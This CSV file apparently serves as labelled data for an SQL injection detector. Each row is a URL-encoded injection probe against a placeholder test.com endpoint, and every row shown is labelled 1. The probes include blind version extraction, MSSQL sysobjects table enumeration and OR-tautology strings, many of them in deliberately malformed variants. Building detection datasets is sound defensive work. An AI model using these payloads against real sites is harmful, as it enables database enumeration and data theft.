URI,label
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%29%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%%28%2929%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%277%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%27%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%29%29%2C1%2C1%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%271%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%28%29%29%29%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C5%2C5%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28VERSION%28%29%2C5%2C5%29%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28VERSION%28%29%2C5%2C5%29%29%28+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%27%291%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C5%2C5%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28VERSION%28%29%2C5%2C5%29%29%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%27300%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%271=1%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+1=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+1=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C90%2C700%29+%3D+%2760%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+%2760%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+1=1%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+1=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%28%29%29%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%27%27%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28%28VERSION%28%28%29%29%2C90%2C700%29%29+%3D+%27%27%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28name%29+from+sysobjects+where+xtype+%3D+%27U%27+and+name+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27%27+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+U+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+600+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+1+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+U+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+1+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+69+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%27%271%27%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+U+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%27%271%27%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%27%271%27%27+in+%28select+min%28lname%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27+and+lname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=OR+3409%3D3409+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%273409%3D3409+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+%27%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27%27%27pytW&Submit=Submit#,1
test.com/sqli/?id=OR+8%3D+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
test.com/sqli/?id=1+OR+%27%271%27%27%3D1+AND+%28%27pytW%27+LIKE+%27pytW&Submit=Submit#,1
